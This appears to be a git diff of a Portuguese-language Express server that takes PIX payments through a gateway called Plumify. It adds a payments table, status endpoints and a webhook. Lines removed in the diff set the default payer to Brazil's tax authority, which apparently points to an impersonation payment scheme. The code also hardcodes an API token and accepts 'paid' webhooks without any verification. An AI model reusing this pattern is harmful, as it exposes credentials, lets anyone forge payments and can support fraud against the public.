@@ -65,6 +65,19 @@ pool.query(`
     )
 `).catch(e => console.log('Tabela admin ok'));
 
+// Criar tabela de pagamentos
+pool.query(`
+    CREATE TABLE IF NOT EXISTS payments (
+        id SERIAL PRIMARY KEY,
+        transaction_id VARCHAR(100) UNIQUE,
+        cpf VARCHAR(14),
+        valor DECIMAL(10,2),
+        status VARCHAR(20) DEFAULT 'pending',
+        data_solicitacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+        data_pagamento TIMESTAMP
+    )
+`).catch(e => console.log('Tabela payments ok'));
+
 // Criar admin padrão
 (async () => {
     try {
@@ -204,19 +217,16 @@ app.post('/api/admin/change-password', async (req, res) => {
     }
     
     try {
-        // Buscar admin
         const result = await pool.query('SELECT * FROM admin_users WHERE username = $1', ['admin']);
         if (result.rows.length === 0) {
             return res.status(404).json({ error: 'Admin não encontrado' });
         }
         
-        // Verificar senha antiga
         const senhaValida = await bcrypt.compare(senha_antiga, result.rows[0].senha_hash);
         if (!senhaValida) {
             return res.status(401).json({ error: 'Senha atual incorreta' });
         }
         
-        // Atualizar para nova senha
         const hash = await bcrypt.hash(nova_senha, 10);
         await pool.query('UPDATE admin_users SET senha_hash = $1 WHERE username = $2', [hash, 'admin']);
         
@@ -226,6 +236,7 @@ app.post('/api/admin/change-password', async (req, res) => {
         res.status(500).json({ error: 'Erro interno do servidor' });
     }
 });
+
 // Servir arquivos estáticos
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
@@ -243,10 +254,39 @@ app.get('/password.html', (req, res) => {
 const PLUMIFY_PRODUCT_HASH = 'lxpykbkgfl';
 const PLUMIFY_API_TOKEN = '1Vp6bm2wSoil2giHCGRjsZ9IGVbiHve4u8xbyUoRWpdvHUWYOj6wZ9yd0xVq';
 
-// Função para gerar ID único da transação
 function generateTransactionId() {
     return 'TX-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex');
 }
+
+// Salvar pagamento solicitado
+app.post('/api/save-payment', async (req, res) => {
+    const { transaction_id, cpf, valor } = req.body;
+    try {
+        await pool.query(
+            'INSERT INTO payments (transaction_id, cpf, valor, status) VALUES ($1, $2, $3, $4) ON CONFLICT (transaction_id) DO NOTHING',
+            [transaction_id, cpf, valor, 'pending']
+        );
+        res.json({ success: true });
+    } catch (error) {
+        console.error('Erro ao salvar pagamento:', error);
+        res.json({ success: false });
+    }
+});
+
+// Verificar status do pagamento
+app.get('/api/check-payment/:transaction_id', async (req, res) => {
+    const { transaction_id } = req.params;
+    try {
+        const result = await pool.query('SELECT status FROM payments WHERE transaction_id = $1', [transaction_id]);
+        if (result.rows.length > 0) {
+            res.json({ status: result.rows[0].status });
+        } else {
+            res.json({ status: 'not_found' });
+        }
+    } catch (error) {
+        res.status(500).json({ error: 'Erro ao verificar pagamento' });
+    }
+});
 
 // Rota para criar pagamento via Plumify
 app.post('/api/create-payment', async (req, res) => {
@@ -263,8 +303,8 @@ app.post('/api/create-payment', async (req, res) => {
         offer_hash: PLUMIFY_PRODUCT_HASH,
         payment_method: 'pix',
         customer: {
-            name: customer_name || 'RECEITA FEDERAL DO BRASIL',
-            email: customer_email || 'receita@fazenda.gov.br',
+            name: customer_name || 'PAGAMENTO UNICO',
+            email: customer_email || 'SAC@com.br',
             phone_number: '21973059827',
             document: customer_cpf || '11144477735'
         },
@@ -323,28 +363,33 @@ app.post('/api/create-payment', async (req, res) => {
     }
 });
 
-// Rota para consultar status do pagamento
-app.get('/api/payment-status/:reference_id', async (req, res) => {
-    const { reference_id } = req.params;
-    
-    try {
-        const response = await fetch(`https://api.Plumify.com.br/api/public/v1/transactions/${reference_id}?api_token=${PLUMIFY_API_TOKEN}`);
-        const data = await response.json();
-        
-        res.json({
-            success: true,
-            status: data.status
-        });
-    } catch (error) {
-        res.status(500).json({ error: 'Erro ao consultar pagamento' });
-    }
-});
-
 // Webhook para receber confirmações de pagamento
 app.post('/api/webhook/pagamento', async (req, res) => {
-    const { hash, status, amount } = req.body;
+    const { hash, status, amount, transaction } = req.body;
     
-    console.log(`📢 Webhook recebido: Transação ${hash} - Status: ${status}`);
+    console.log(`📢 Webhook recebido:`);
+    console.log(`🔑 Transação: ${hash || transaction}`);
+    console.log(`💰 Status: ${status}`);
+    
+    if (status === 'paid') {
+        try {
+            const result = await pool.query('SELECT * FROM payments WHERE transaction_id = $1', [hash || transaction]);
+            
+            if (result.rows.length > 0) {
+                await pool.query('UPDATE payments SET status = $1, data_pagamento = NOW() WHERE transaction_id = $2', 
+                    ['paid', hash || transaction]);
+                console.log(`Pagamento confirmado para transação: ${hash || transaction}`);
+            } else {
+                await pool.query(
+                    'INSERT INTO payments (transaction_id, status, valor, data_pagamento) VALUES ($1, $2, $3, NOW())',
+                    [hash || transaction, 'paid', amount ? amount / 100 : 0]
+                );
+                console.log(`Novo pagamento registrado: ${hash || transaction}`);
+            }
+        } catch (error) {
+            console.error('Erro ao processar webhook:', error);
+        }
+    }
     
     res.json({ received: true });
 });
